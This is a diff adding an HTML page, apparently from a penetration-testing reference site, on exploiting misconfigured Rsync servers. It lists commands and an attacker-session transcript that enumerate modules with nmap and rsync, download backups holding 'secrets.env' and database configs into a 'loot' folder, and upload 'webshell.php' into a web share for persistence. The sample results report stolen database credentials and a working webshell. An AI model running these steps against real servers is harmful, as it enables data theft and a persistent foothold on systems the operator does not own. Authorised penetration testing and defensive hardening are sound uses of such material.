@@ -1,0 +1,180 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">Rsync Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>File Sharing</strong> • Focus: <strong>Rsync Abuse & Data Exfiltration</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Rsync (TCP/873) is a fast file transfer and synchronization protocol commonly used 
+    for backups and system replication. Misconfigured Rsync modules often allow 
+    anonymous read/write access, exposing sensitive data or enabling attackers to 
+    upload malicious files. Attackers exploit Rsync to enumerate modules, download 
+    source code or credentials, and inject persistence (e.g., webshells, cronjobs) 
+    into writable shares. In real-world intrusions, open Rsync servers have been 
+    abused for data leaks and ransomware staging.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Anonymous Access:</strong> Misconfigured Rsync modules allow access without creds.</li>
+    <li><strong>Data Exposure:</strong> Backups, configs, API keys often stored in Rsync shares.</li>
+    <li><strong>Writable Modules:</strong> Uploading files can lead to RCE or persistence.</li>
+    <li><strong>No Encryption:</strong> Credentials/data can be sniffed in plaintext.</li>
+    <li><strong>Automation Risk:</strong> Linked cronjobs/systemd may execute attacker-synced files.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify Rsync service on TCP/873.</li>
+    <li><strong>Enumeration:</strong> List available modules with anonymous connection.</li>
+    <li><strong>Data Exfiltration:</strong> Sync/download exposed directories.</li>
+    <li><strong>Exploitation:</strong> Upload malicious files to writable modules.</li>
+    <li><strong>Impact:</strong> Sensitive data theft, persistence, and potential RCE.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for Rsync on TCP/873.</li>
+    <li>List available modules with <code>rsync --list-only</code>.</li>
+    <li>Download files for analysis.</li>
+    <li>Test write access by uploading files.</li>
+    <li>Leverage writable shares for persistence or lateral movement.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p873 --script rsync-list-modules [target]
+
+# ------------------------------
+# List Available Modules
+# ------------------------------
+rsync rsync://[target]/
+rsync rsync://[target]/module_name
+
+# ------------------------------
+# Download Files
+# ------------------------------
+rsync -av rsync://[target]/module_name/ ./loot/
+
+# ------------------------------
+# Upload Files (if writable)
+# ------------------------------
+rsync -av ./backdoor.php rsync://[target]/module_name/www/
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p873 192.168.1.190 --script rsync-list-modules
+rsync rsync://192.168.1.190/
+rsync -av rsync://192.168.1.190/backups ./stolen_backups/
+rsync -av ./webshell.php rsync://192.168.1.190/website/
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p873 --script rsync-list-modules 192.168.1.190
+PORT    STATE SERVICE
+873/tcp open  rsync
+| rsync-list-modules:
+|   backups
+|   website
+|   logs
+
+[ saide ~ ]$ rsync rsync://192.168.1.190/backups
+drwxr-xr-x        4,096 2025/09/01 00:00:00 .
+-rw-r--r--          512 2025/09/01 00:00:00 db.conf
+-rw-r--r--        1,024 2025/09/01 00:00:00 secrets.env
+
+[ saide ~ ]$ rsync -av rsync://192.168.1.190/backups ./loot/
+receiving incremental file list
+db.conf
+secrets.env
+
+[+] Sensitive configs exfiltrated
+
+[ saide ~ ]$ rsync -av ./webshell.php rsync://192.168.1.190/website/
+sending incremental file list
+webshell.php
+
+sent 500 bytes  received 20 bytes  1,040.00 bytes/sec
+[+] Uploaded malicious file — persistence established
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample Rsync exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+873/tcp open  rsync
+
+# Modules Found
+backups
+website
+logs
+
+# Exploitation
+Downloaded db.conf and secrets.env
+Uploaded webshell.php into website share
+
+# Proof of Exploitation
+Accessed stolen DB creds
+Confirmed webshell execution on target server
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting Rsync
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1078/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – Valid Accounts
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → List modules → Exfiltrate sensitive data → Test write access → Establish persistence.</li>
+  </ul>
+</section>
